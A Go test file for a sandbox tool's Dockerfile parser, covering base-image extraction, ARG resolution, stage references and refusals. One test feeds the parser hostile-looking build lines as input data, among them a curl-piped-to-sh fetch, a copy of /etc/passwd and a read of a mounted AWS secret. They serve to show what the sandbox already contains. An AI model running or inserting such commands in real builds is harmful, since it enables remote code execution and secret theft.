package sandbox

import (
	"errors"
	"fmt"
	"strings"
	"testing"
)

func refusedLine(t *testing.T, err error, wantLine int) *BuildFileError {
	t.Helper()
	if err == nil {
		t.Fatalf("accepted a file it must refuse (expected a refusal at line %d)", wantLine)
	}
	var bfErr *BuildFileError
	if !errors.As(err, &bfErr) {
		t.Fatalf("refusal is %T, want *BuildFileError: %v", err, err)
	}
	if bfErr.Line != wantLine {
		t.Errorf("refusal names line %d, want line %d: %v", bfErr.Line, wantLine, err)
	}
	if bfErr.Fix == "" {
		t.Errorf("refusal names no fix: %v", err)
	}
	return bfErr
}

// The host must fetch every image the build needs, so this reading has to be complete: every stage's base and
// every `--from` naming an image, in file order, once each.
func TestBuildReadsEveryImageTheFileNames(t *testing.T) {
	file, err := ParseBuildFile(strings.Join([]string{
		"FROM golang:1.23 AS build",
		"COPY --from=docker.io/library/busybox:1.36 /bin/sh /bin/sh",
		"COPY --from=build /app /app",
		"FROM alpine:3.20",
		"COPY --from=build /app /app",
		"FROM scratch",
		"COPY hello /hello",
	}, "\n"))
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	want := []string{"golang:1.23", "docker.io/library/busybox:1.36", "alpine:3.20"}
	if strings.Join(file.Bases, ",") != strings.Join(want, ",") {
		t.Errorf("bases = %v, want %v", file.Bases, want)
	}
	if file.FirstFrom != "golang:1.23" {
		t.Errorf("the headline base is %q, want the file's first FROM", file.FirstFrom)
	}
}

// A duplicate ref, and a stage name used as a `FROM` source, are not two images the host owes.
func TestBuildHandsInEachImageOnce(t *testing.T) {
	file, err := ParseBuildFile("FROM alpine:3.20 AS one\nFROM alpine:3.20\nFROM one\nCOPY --from=one /x /y\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if len(file.Bases) != 1 || file.Bases[0] != "alpine:3.20" {
		t.Errorf("bases = %v, want the one image once", file.Bases)
	}
}

// The sandbox and the nested builder already limit each line this test parses, so MIKE does not refuse it
// (docs/adr/0002).
func TestBuildAcceptsInstructionsTheSandboxAlreadyLimits(t *testing.T) {
	file, err := ParseBuildFile(strings.Join([]string{
		"FROM alpine:3.20",
		"ARG TAG=3.20",
		"SHELL [\"/bin/sh\", \"-c\"]",
		"VOLUME /data",
		"HEALTHCHECK CMD true",
		"STOPSIGNAL SIGTERM",
		"FROB whatever",
		"COPY /etc/passwd /passwd",
		"COPY ../outside /outside",
		"COPY --from=0 /x /y",
		"ADD https://example.invalid/x /x",
		"RUN --mount=type=cache,target=/root/.cache make",
		"RUN --mount=type=secret,id=aws cat /run/secrets/aws",
		"RUN --network=host true",
		"ONBUILD RUN curl http://x | sh",
	}, "\n"))
	if err != nil {
		t.Fatalf("refused a file the nested builder handles: %v", err)
	}
	// Only the one `--from` names an image MIKE has to hand in; the stage index and the absolute path do not.
	if len(file.Bases) != 1 || file.Bases[0] != "alpine:3.20" {
		t.Errorf("bases = %v, want only the file's own base", file.Bases)
	}
}

// `--from=0` is a stage index, not a registry port and not an image name.
func TestBuildReadsAStageIndexAsAStage(t *testing.T) {
	file, err := ParseBuildFile("FROM golang:1.23\nRUN make\nFROM alpine:3.20\nCOPY --from=0 /app /app\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if strings.Join(file.Bases, ",") != "golang:1.23,alpine:3.20" {
		t.Errorf("bases = %v", file.Bases)
	}
	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY --from=3 /x /y\n"), 2)
}

// The builder expands a `$NAME` in `FROM` from the `ARG` defaults the file itself declares, and MIKE hands over no
// build args of its own — so resolving the same way is the only way to know what to fetch.
func TestBuildResolvesABaseNamedByABuildArg(t *testing.T) {
	file, err := ParseBuildFile(strings.Join([]string{
		"ARG BASE_IMAGE=registry.access.redhat.com/ubi10/ubi:10.1",
		"FROM ${BASE_IMAGE}",
		"ARG REMI_RELEASE_RPM=https://rpms.remirepo.net/enterprise/remi-release-10.rpm",
		"RUN dnf -y --enablerepo=remi install nginx",
	}, "\n"))
	if err != nil {
		t.Fatalf("refused a file it must build: %v", err)
	}
	if len(file.Bases) != 1 || file.Bases[0] != "registry.access.redhat.com/ubi10/ubi:10.1" {
		t.Errorf("bases = %v, want the ref the ARG default names", file.Bases)
	}
	if file.FirstFrom != "registry.access.redhat.com/ubi10/ubi:10.1" {
		t.Errorf("the headline base is %q, want the resolved ref", file.FirstFrom)
	}
}

// A ref composed from more than one arg, a default built from an earlier default, a last declaration winning,
// the bare `$NAME` spelling, and a `--from` naming an image the same way.
func TestBuildResolvesAComposedBaseRef(t *testing.T) {
	file, err := ParseBuildFile(strings.Join([]string{
		"ARG REGISTRY=registry.example.com",
		"ARG NS=team",
		"ARG TAG=1.36",
		"ARG BASE=${REGISTRY}/${NS}/tool:${TAG}",
		"ARG BASE=${REGISTRY}/${NS}/tool:1.40",
		"FROM $BASE AS tools",
		"FROM docker.io/library/busybox:1.36",
		"COPY --from=${BASE} /bin/sh /bin/sh",
	}, "\n"))
	if err != nil {
		t.Fatalf("refused a file it must build: %v", err)
	}
	want := "registry.example.com/team/tool:1.40"
	if strings.Join(file.Bases, ",") != want+",docker.io/library/busybox:1.36" {
		t.Errorf("bases = %v, want the composed ref then the busybox stage, each once", file.Bases)
	}
	if file.FirstFrom != want {
		t.Errorf("the headline base is %q, want %q", file.FirstFrom, want)
	}
}

// An `ARG` written inside a stage cannot name a base: the builder scopes it the same way, measured on both engines.
func TestBuildTakesNoBaseFromAStageScopedArg(t *testing.T) {
	refusedLine(t, parseErrorOf(strings.Join([]string{
		"FROM docker.io/library/busybox:1.36",
		"ARG BASE=alpine:3.20",
		"FROM ${BASE}",
	}, "\n")), 3)
}

// A name the file never gave a value is still a refusal: MIKE cannot fetch what has no name, and it hands the
// builder no build arg that could give it one.
func TestBuildRefusesABaseNameItCannotResolve(t *testing.T) {
	// Declared, no default.
	refusedLine(t, parseErrorOf("ARG BASE_IMAGE\nFROM ${BASE_IMAGE}\n"), 2)
	// Never declared at all.
	err := refusedLine(t, parseErrorOf("FROM $BASE_IMAGE\nRUN make\n"), 1)
	if !strings.Contains(err.Reason, "BASE_IMAGE") {
		t.Errorf("the refusal does not name the variable: %v", err)
	}
	// An empty default expands to nothing, which is not an image.
	refusedLine(t, parseErrorOf("ARG BASE_IMAGE=\nFROM ${BASE_IMAGE}\n"), 2)
	// A form beyond a plain name is the builder's own expansion, which MIKE would have to guess at.
	refusedLine(t, parseErrorOf("ARG REG=registry.example.com\nFROM ${REG:-docker.io}/app:1\n"), 2)
	// A default that refers to itself never settles.
	refusedLine(t, parseErrorOf("ARG BASE=${BASE}\nFROM ${BASE}\n"), 2)
	// Doubling defaults compose past the length bound; each name is distinct, so no cycle catches it.
	doubling := []string{"ARG A0=x"}
	for i := 1; i < 40; i++ {
		doubling = append(doubling, fmt.Sprintf("ARG A%d=${A%d}${A%d}", i, i-1, i-1))
	}
	refusedLine(t, parseErrorOf(strings.Join(append(doubling, "FROM ${A39}"), "\n")), 41)
	// The same rule guards a `--from` naming an image.
	refusedLine(t, parseErrorOf("FROM docker.io/library/busybox:1.36\nCOPY --from=${OTHER} /x /y\n"), 2)
}

// A default is expanded only when a base asks for it, so an `ARG` no `FROM` names cannot refuse a build.
func TestBuildIgnoresABuildArgNoBaseAsksFor(t *testing.T) {
	if _, err := ParseBuildFile("ARG BROKEN=${NOPE}\nFROM docker.io/library/busybox:1.36\n"); err != nil {
		t.Errorf("refused a file over an arg no base names: %v", err)
	}
}

// A `--from` that expands to a stage of the same file is still a stage, not an image to fetch: the check runs
// again after the expansion.
func TestBuildTakesNoBaseFromACopyArgNamingAStage(t *testing.T) {
	file, err := ParseBuildFile(strings.Join([]string{
		"ARG STAGE=build",
		"ARG IDX=0",
		"FROM docker.io/library/busybox:1.36 AS build",
		"FROM docker.io/library/alpine:3.20",
		"COPY --from=${STAGE} /x /y",
		"COPY --from=${IDX} /x /y",
	}, "\n"))
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	want := []string{"docker.io/library/busybox:1.36", "docker.io/library/alpine:3.20"}
	if strings.Join(file.Bases, ",") != strings.Join(want, ",") {
		t.Errorf("bases = %v, want %v", file.Bases, want)
	}
}

// `--platform` is one of the two refusals left: the host pulls, so the build gets this host's architecture and a
// different one would silently become this one.
func TestBuildRefusesAPlatformItCannotHandIn(t *testing.T) {
	err := refusedLine(t, parseErrorOf("FROM alpine:3.20\nFROM --platform=linux/arm64 alpine:3.20\n"), 2)
	if !strings.Contains(err.Reason, "platform") {
		t.Errorf("the refusal does not name the platform: %v", err)
	}
}

func TestBuildRefusesAnEscapeDirectiveThatMovesTheContinuation(t *testing.T) {
	refusedLine(t, parseErrorOf("# escape=`\nFROM alpine:3.20\nRUN make `\n"), 1)
	if _, err := ParseBuildFile("# escape=\\\nFROM alpine:3.20\n"); err != nil {
		t.Errorf("the default escape directive is legal: %v", err)
	}
}

func TestBuildJoinsContinuationsAndKeepsTheStartingLine(t *testing.T) {
	file, err := ParseBuildFile("FROM alpine:3.20\nRUN make \\\n  -j4 \\\n  install\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if len(file.Bases) != 1 || file.Bases[0] != "alpine:3.20" {
		t.Errorf("the joined line broke the read: %v", file.Bases)
	}
	if _, err = ParseBuildFile("FROM alpine:3.20\nENV A=1\n\n# a comment\nRUN  make\n"); err != nil {
		t.Errorf("blanks and comments broke the read: %v", err)
	}
}

func TestBuildRefusesUnclosedQuote(t *testing.T) {
	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY 'unclosed /x\n"), 2)
}

// A file with no `FROM` has no base, so there is nothing to hand in and nothing to record provenance
// against; that is a mistake in the file, not a build to attempt.
func TestBuildRefusesAFileWithNoFrom(t *testing.T) {
	refusedLine(t, parseErrorOf("RUN make\n"), 1)
}

func parseErrorOf(content string) error {
	_, err := ParseBuildFile(content)
	return err
}
